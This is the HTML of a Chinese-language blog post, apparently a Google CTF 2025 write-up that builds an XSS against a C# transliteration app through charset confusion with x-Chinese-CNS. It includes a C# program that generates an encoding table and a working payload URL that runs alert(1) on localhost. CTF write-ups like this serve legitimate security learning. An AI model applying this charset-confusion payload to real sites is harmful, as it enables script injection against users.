@@ -1,0 +1,449 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="题目分析这是一个c#web，实现了一个希腊语到拉丁语的音译器，问题出在处理静态文件时（实际上是硬编码在变量中的）contentType可以被用户控制。  我们关注到script.js  当把它处理成html时，刚好能凑出一对&lt;script&gt;而其中的TEMPLATE_QUERY_JS可控  但是传入的参数q中的字符如果不是这三种则会被unicode编码，单引号等符号都会被编码  其实Co">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Googlectf2025-lost-in-transliteration-writeup">
+<meta property="og:url" content="https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/index.html">
+<meta property="og:site_name" content="le0n&#39;s blogs">
+<meta property="og:description" content="题目分析这是一个c#web，实现了一个希腊语到拉丁语的音译器，问题出在处理静态文件时（实际上是硬编码在变量中的）contentType可以被用户控制。  我们关注到script.js  当把它处理成html时，刚好能凑出一对&lt;script&gt;而其中的TEMPLATE_QUERY_JS可控  但是传入的参数q中的字符如果不是这三种则会被unicode编码，单引号等符号都会被编码  其实Co">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://0wlle0n.github.io/images/7a7d09775f48143fde8b5137ab711df9.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/e3724016d78a70a95d8980e431cf05fd.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/74ac5c9aabd7d38f3a867db960186733.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/45059f702acd77e0f47351c647203c48.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/2acb304ea36ed3699a066d341584d026.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/5b10be7454811f59fdab9a37092ce0ad.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/86ab1f494157b245073b8cad8be5f496.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/122c1d46198fb71227580a9d8efbf265.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/df8c33d44e7ba80b86261216a628bda3.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/ecd50fd3c694ef2945f3251bbdbc1e67.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/9350db7f16d538f25ea0167b6b1d90ec.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/4f9db8b5e8bcf2ac8b35555bc0553499.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/24386d7cab4237871ace7551780ae055.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/484a10e39fa03ff6040388003056ffeb.png">
+<meta property="og:image" content="https://0wlle0n.github.io/images/122c1d46198fb71227580a9d8efbf265.png">
+<meta property="article:published_time" content="2025-07-07T13:04:00.000Z">
+<meta property="article:modified_time" content="2025-07-07T13:06:41.339Z">
+<meta property="article:author" content="le0n">
+<meta property="article:tag" content="xss">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://0wlle0n.github.io/images/7a7d09775f48143fde8b5137ab711df9.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>Googlectf2025-lost-in-transliteration-writeup</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+  <script async src="https://www.googletagmanager.com/gtag/js?id=G-Y7V18M7XFP"></script>
+  <script>
+      window.dataLayer = window.dataLayer || [];
+      function gtag(){dataLayer.push(arguments);}
+      gtag('js', new Date());
+      gtag('config', 'G-Y7V18M7XFP');
+  </script>
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about">About</a></li><!--
+     --><!--
+       --><li><a href="/friends">friends</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" aria-label="Next post" href="/2025/06/10/Kras_load_model_rce(cve-2025-1550)/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&text=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&title=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&is_video=false&description=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=Googlectf2025-lost-in-transliteration-writeup&body=Check out this article: https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&title=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&title=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&title=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&title=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&name=Googlectf2025-lost-in-transliteration-writeup&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://0wlle0n.github.io/2025/07/07/Googlectf2025-lost-in-transliteration-writeup/&t=Googlectf2025-lost-in-transliteration-writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E7%BC%96%E7%A0%81%E8%A1%A8"><span class="toc-number">1.1.</span> <span class="toc-text">获取编码表</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9E%84%E9%80%A0payload"><span class="toc-number">2.</span> <span class="toc-text">构造payload</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%83%E9%80%B8%E5%8D%95%E5%BC%95%E5%8F%B7"><span class="toc-number">2.1.</span> <span class="toc-text">逃逸单引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%97%AD%E5%90%88%E5%8F%B3%E8%BE%B9%E5%BC%95%E5%8F%B7"><span class="toc-number">2.2.</span> <span class="toc-text">闭合右边引号</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E5%85%83%E8%A1%A8%E8%BE%BE%E5%BC%8F%E5%A4%84%E7%90%86tag"><span class="toc-number">2.3.</span> <span class="toc-text">三元表达式处理tag?</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A8%A1%E6%9D%BF%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%89%A7%E8%A1%8C%E4%BB%A3%E7%A0%81"><span class="toc-number">2.4.</span> <span class="toc-text">模板字符串执行代码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%80%E5%90%8E%E7%9A%84payload"><span class="toc-number">2.5.</span> <span class="toc-text">最后的payload</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        Googlectf2025-lost-in-transliteration-writeup
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">le0n</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-07-07T13:04:00.000Z" class="dt-published" itemprop="datePublished">2025-07-07</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/xss/" rel="tag">xss</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <h2 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h2><p>这是一个c#web，实现了一个希腊语到拉丁语的音译器，问题出在处理静态文件时（实际上是硬编码在变量中的）contentType可以被用户控制。</p>
+<p><img src="/images/7a7d09775f48143fde8b5137ab711df9.png"></p>
+<p>我们关注到script.js</p>
+<p><img src="/images/e3724016d78a70a95d8980e431cf05fd.png"></p>
+<p>当把它处理成html时，刚好能凑出一对<code>&lt;script&gt;</code>而其中的TEMPLATE_QUERY_JS可控</p>
+<p><img src="/images/74ac5c9aabd7d38f3a867db960186733.png"></p>
+<p>但是传入的参数q中的字符如果不是这三种则会被unicode编码，单引号等符号都会被编码</p>
+<p><img src="/images/45059f702acd77e0f47351c647203c48.png"></p>
+<p>其实ContentType还可以控制字符集<code>ct=text/html;charset=X-Chinese-CNS</code>就能造成字符集混淆。其实就是csharp支持该编码，而chrome不支持，导致csharp按照X-Chinese-CNS编码OtherLetter中的字符后，chrome依然用默认方式解码，导致把多字节字符的字节拆开解析，逃逸出单引号。</p>
+<p>要本地模拟的话就是把字符用X-Chinese-CNS编码，utf-8解码，但是一般语言对这个字符集的支持都很差。</p>
+<h3 id="获取编码表"><a href="#获取编码表" class="headerlink" title="获取编码表"></a>获取编码表</h3><p>这个编码表比较难获取，我们直接用docker中的环境来运行c#爆破获取</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line">using System;</span><br><span class="line">using System.Collections.Generic;</span><br><span class="line">using System.IO;</span><br><span class="line">using System.Text;</span><br><span class="line">using System.Globalization;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">EncodingTableGenerator</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Main</span><span class="params">()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 注册代码页编码提供者，支持更多编码</span></span><br><span class="line">        Encoding.RegisterProvider(CodePagesEncodingProvider.Instance);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 可配置参数</span></span><br><span class="line">        <span class="type">string</span> <span class="variable">encodingName</span> <span class="operator">=</span> <span class="string">&quot;x-Chinese-CNS&quot;</span>;  <span class="comment">// 目标编码</span></span><br><span class="line">        <span class="type">string</span> <span class="variable">outputFilePath</span> <span class="operator">=</span> $<span class="string">&quot;encoding_table_&#123;encodingName&#125;_OtherLetter_SuccessOnly.txt&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 获取目标编码，禁用替换回退（编码失败时抛出异常）</span></span><br><span class="line">            <span class="type">Encoding</span> <span class="variable">targetEncoding</span> <span class="operator">=</span> Encoding.GetEncoding(</span><br><span class="line">                encodingName,</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">EncoderExceptionFallback</span>(),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">DecoderExceptionFallback</span>()</span><br><span class="line">            );</span><br><span class="line"></span><br><span class="line">            Console.WriteLine($<span class="string">&quot;正在生成 &#123;encodingName&#125; 编码的 Other Letter 成功编码映射表...&quot;</span>);</span><br><span class="line">            using (<span class="type">StreamWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StreamWriter</span>(outputFilePath, <span class="literal">false</span>, Encoding.UTF8))</span><br><span class="line">            &#123;</span><br><span class="line">                writer.WriteLine($<span class="string">&quot;Other Letter 成功编码映射表 - &#123;encodingName&#125;&quot;</span>);</span><br><span class="line">                writer.WriteLine($<span class="string">&quot;生成时间: &#123;DateTime.Now&#125;&quot;</span>);</span><br><span class="line">                writer.WriteLine(<span class="string">&quot;========================================================&quot;</span>);</span><br><span class="line">                writer.WriteLine(<span class="string">&quot;Unicode码点\t字符\t字符名称\t编码字节(Hex)&quot;</span>);</span><br><span class="line">                writer.WriteLine(<span class="string">&quot;========================================================&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="type">int</span> <span class="variable">totalChars</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">successfullyEncodedChars</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">                <span class="comment">// 遍历所有Unicode字符 (U+0000 到 U+10FFFF)</span></span><br><span class="line">                <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">codePoint</span> <span class="operator">=</span> <span class="number">0</span>; codePoint &lt;= <span class="number">0x10FFFF</span>; codePoint++)</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="comment">// 跳过代理区 (U+D800 - U+DFFF)</span></span><br><span class="line">                    <span class="keyword">if</span> (codePoint &gt;= <span class="number">0xD800</span> &amp;&amp; codePoint &lt;= <span class="number">0xDFFF</span>)</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// 检查是否为 Other Letter (Lo) 类别</span></span><br><span class="line">                    <span class="type">char</span> <span class="variable">c</span> <span class="operator">=</span> (<span class="type">char</span>)codePoint;</span><br><span class="line">                    <span class="keyword">if</span> (CharUnicodeInfo.GetUnicodeCategory(c) != UnicodeCategory.OtherLetter)</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">                    totalChars++;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">try</span></span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 转换为Unicode字符</span></span><br><span class="line">                        <span class="type">string</span> <span class="variable">unicodeChar</span> <span class="operator">=</span> <span class="type">char</span>.ConvertFromUtf32(codePoint);</span><br><span class="line">                        <span class="type">string</span> <span class="variable">charName</span> <span class="operator">=</span> GetUnicodeCharName(unicodeChar);</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 尝试编码</span></span><br><span class="line">                        <span class="type">byte</span>[] encodedBytes = targetEncoding.GetBytes(unicodeChar);</span><br><span class="line">                        <span class="type">string</span> <span class="variable">hexBytes</span> <span class="operator">=</span> BitConverter.ToString(encodedBytes).Replace(<span class="string">&quot;-&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        writer.WriteLine($<span class="string">&quot;U+&#123;codePoint:X4&#125;\t&#123;unicodeChar&#125;\t&#123;charName&#125;\t&#123;hexBytes&#125;&quot;</span>);</span><br><span class="line">                        successfullyEncodedChars++;</span><br><span class="line"></span><br><span class="line">                        <span class="comment">// 每成功编码100个字符显示进度</span></span><br><span class="line">                        <span class="keyword">if</span> (successfullyEncodedChars % <span class="number">100</span> == <span class="number">0</span>)</span><br><span class="line">                        &#123;</span><br><span class="line">                            Console.WriteLine($<span class="string">&quot;已成功编码: &#123;successfullyEncodedChars&#125;&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (EncoderFallbackException)</span><br><span class="line">                    &#123;</span><br><span class="line">                        <span class="comment">// 静默跳过无法编码的字符</span></span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">                    &#123;</span><br><span class="line">                        Console.WriteLine($<span class="string">&quot;处理 U+&#123;codePoint:X4&#125; 时出错: &#123;ex.Message&#125;&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                writer.WriteLine(<span class="string">&quot;========================================================&quot;</span>);</span><br><span class="line">                writer.WriteLine($<span class="string">&quot;总计 Other Letter 字符数: &#123;totalChars&#125;&quot;</span>);</span><br><span class="line">                writer.WriteLine($<span class="string">&quot;成功编码字符数: &#123;successfullyEncodedChars&#125; (&#123;successfullyEncodedChars * 100.0 / totalChars:F2&#125;%)&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            Console.WriteLine($<span class="string">&quot;编码映射表已生成至: &#123;outputFilePath&#125;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (ArgumentException ex)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine($<span class="string">&quot;错误: 不支持的编码名称 &#x27;&#123;encodingName&#125;&#x27;。异常: &#123;ex.Message&#125;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> (Exception ex)</span><br><span class="line">        &#123;</span><br><span class="line">            Console.WriteLine($<span class="string">&quot;发生未知错误: &#123;ex.Message&#125;&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取Unicode字符名称</span></span><br><span class="line">    <span class="keyword">static</span> string <span class="title function_">GetUnicodeCharName</span><span class="params">(string unicodeChar)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">try</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span> (string.IsNullOrEmpty(unicodeChar))</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;空字符&quot;</span>;</span><br><span class="line">                </span><br><span class="line">            <span class="keyword">if</span> (unicodeChar.Length == <span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> Char.GetUnicodeCategory(unicodeChar[<span class="number">0</span>]).ToString();</span><br><span class="line">                </span><br><span class="line">            <span class="comment">// 代理对处理</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;代理对字符&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;未知名称&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>生成的编码表：<a href="/appendix/encoding_table_x-Chinese-CNS.txt">encoding_table_x-Chinese-CNS.txt</a></p>
+<h2 id="构造payload"><a href="#构造payload" class="headerlink" title="构造payload"></a>构造payload</h2><h3 id="逃逸单引号"><a href="#逃逸单引号" class="headerlink" title="逃逸单引号"></a>逃逸单引号</h3><p>先搜索27逃逸出引号</p>
+<p><img src="/images/2acb304ea36ed3699a066d341584d026.png"></p>
+<p><img src="/images/5b10be7454811f59fdab9a37092ce0ad.png"></p>
+<h3 id="闭合右边引号"><a href="#闭合右边引号" class="headerlink" title="闭合右边引号"></a>闭合右边引号</h3><p>右半个引号由于没办法弄出注释(不会有这样的字符的，这个编码分高低位)，可以选择和这个&#96;&#96;&#96;闭合</p>
+<p><img src="/images/86ab1f494157b245073b8cad8be5f496.png"></p>
+<p><img src="/images/122c1d46198fb71227580a9d8efbf265.png"></p>
+<p>然后变成了这样<code>佘%0aalert(1)%0a氶</code></p>
+<p><img src="/images/df8c33d44e7ba80b86261216a628bda3.png"></p>
+<h3 id="三元表达式处理tag"><a href="#三元表达式处理tag" class="headerlink" title="三元表达式处理tag?"></a>三元表达式处理tag?</h3><p>然后是<code>tag?</code>在前面不处理会报错，使用三元表达式</p>
+<p>找个冒号</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U+<span class="number">761D</span>	瘝	OtherLetter	D23A</span><br></pre></td></tr></table></figure>
+
+<p>多出来的字符用两个??（ Null 合并运算符  ）来处理</p>
+<p><img src="/images/ecd50fd3c694ef2945f3251bbdbc1e67.png"></p>
+<p><code>艹</code>这个字符不会被两种编码处理，最后成为<code>?</code></p>
+<p><img src="/images/9350db7f16d538f25ea0167b6b1d90ec.png"><br>冒号右边需要塞一个东西，没有引号塞不了字符串，我们直接塞全局变量或者函数</p>
+<p><img src="/images/4f9db8b5e8bcf2ac8b35555bc0553499.png"></p>
+<h3 id="模板字符串执行代码"><a href="#模板字符串执行代码" class="headerlink" title="模板字符串执行代码"></a>模板字符串执行代码</h3><p>我们没办法构造出括号，但是js的一个特性<strong>模板字符串给了我们机会</strong></p>
+<p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Template_literals</a></p>
+<p><img src="/images/24386d7cab4237871ace7551780ae055.png"></p>
+<p>而且它支持在&#96;&#96;&#96;&#96;中使用unicode转义序列</p>
+<p><img src="/images/484a10e39fa03ff6040388003056ffeb.png"></p>
+<p><strong>但是模板字符串会被作为一个数组传入函数的第一个参数</strong>，所以这里只能用setTimeout执行代码（自动toString）</p>
+<p>为此，我们先找出一个等于号，并且等于号前面的字符要作为合法变量名</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U+56AD	嚭	OtherLetter	E53D</span><br></pre></td></tr></table></figure>
+
+<p>然后再找这个<code>变量</code>+&#96;&#96;&#96;的字符，也就是E560</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U+6AEB	櫫	OtherLetter	E560</span><br></pre></td></tr></table></figure>
+
+<p>为了方便(不用再定义变量)我们把刚才用来闭合右单引号的<img src="/images/122c1d46198fb71227580a9d8efbf265.png">也换成这个</p>
+<p>模板字符串中为了注释掉0xE5使用了<code>alert(1)//</code></p>
+<h3 id="最后的payload"><a href="#最后的payload" class="headerlink" title="最后的payload"></a>最后的payload</h3><p>发现不加var tag，第一句三元表达式tag未定义会报错</p>
+<p>所以最后的pyload:</p>
+<p><code>佘艹艹瘝window%0avar+tag%0avar+嚭setTimeout%0a櫫alert(1)//櫫%0a櫫</code></p>
+<p>执行的js可以随意改</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost:1337/file?filename=script.js&amp;ct=text/html;charset=x-chinese-cns&amp;q=%E4%BD%98%E8%89%B9%E8%89%B9%E7%98%9Dwindow%0avar+tag%0avar+%E5%9A%ADsetTimeout%0a%E6%AB%ABalert(1)//%E6%AB%AB%0a%E6%AB%AB</span></span><br></pre></td></tr></table></figure>
+
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about">About</a></li>
+        
+          <li><a href="/friends">friends</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
